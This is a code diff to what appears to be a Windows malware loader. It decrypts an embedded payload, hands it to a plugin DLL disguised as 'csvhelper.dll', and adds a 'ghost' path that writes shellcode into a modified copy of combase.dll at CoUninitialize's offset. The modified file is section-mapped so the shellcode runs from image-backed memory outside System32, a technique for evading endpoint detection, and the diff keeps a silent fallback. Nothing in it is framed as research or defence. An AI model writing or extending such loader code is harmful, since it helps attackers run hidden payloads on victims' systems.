@@ -39,6 +39,7 @@
 #include "payload_key.h"  /* payload_key[], payload_key_len,
                               payload_iv[],  payload_iv_len  */
 #include "hellshall.h"    /* unused here — declarations only, no link dep */
+#include "ghost.h"        /* PE section mapping utility */
 
 #ifndef PLUGIN_NAME
 #  define PLUGIN_NAME "csvhelper.dll"
@@ -49,6 +50,7 @@
 static BYTE  *s_payload_ptr = NULL;
 static SIZE_T s_payload_len = 0;
 static HANDLE s_thread      = NULL;
+static void  *s_ghost_addr  = NULL;
 
 __declspec(dllexport) void GetPayload(void **out_ptr, SIZE_T *out_len)
 {
@@ -59,6 +61,11 @@ __declspec(dllexport) void GetPayload(void **out_ptr, SIZE_T *out_len)
 __declspec(dllexport) void SetThreadHandle(HANDLE h)
 {
     s_thread = h;
+}
+
+__declspec(dllexport) void *GetGhostAddr(void)
+{
+    return s_ghost_addr;
 }
 
 /* ── Poseidon I/O noise ───────────────────────────────────────────────────── */
@@ -183,8 +190,17 @@ int WINAPI WinMain(HINSTANCE hi, HINSTANCE hp, LPSTR lp, int ns)
     LocalFree(ct);
     if (!pt) return 1;
 
+    /* Try mapping a modified combase.dll as MEM_IMAGE first: writes the
+     * PICO bytes into CoUninitialize's file offset, section-maps the
+     * modified file, returns an address inside a MEM_IMAGE region with a
+     * disk backing outside of System32. Success skips the plugin's
+     * combase-in-place slot-flip path entirely. Failure is silent; the
+     * plugin's DllMain will fall through to the legacy path. */
+    s_ghost_addr = ghost_map(pt, pt_len);
+
     /* Stash plaintext in launcher statics: LoadLibraryA below fires the
-     * plugin's DllMain, which retrieves these via the GetPayload export. */
+     * plugin's DllMain, which retrieves these via the GetPayload export
+     * when the ghost path was unavailable. */
     s_payload_ptr = pt;
     s_payload_len = pt_len;
 
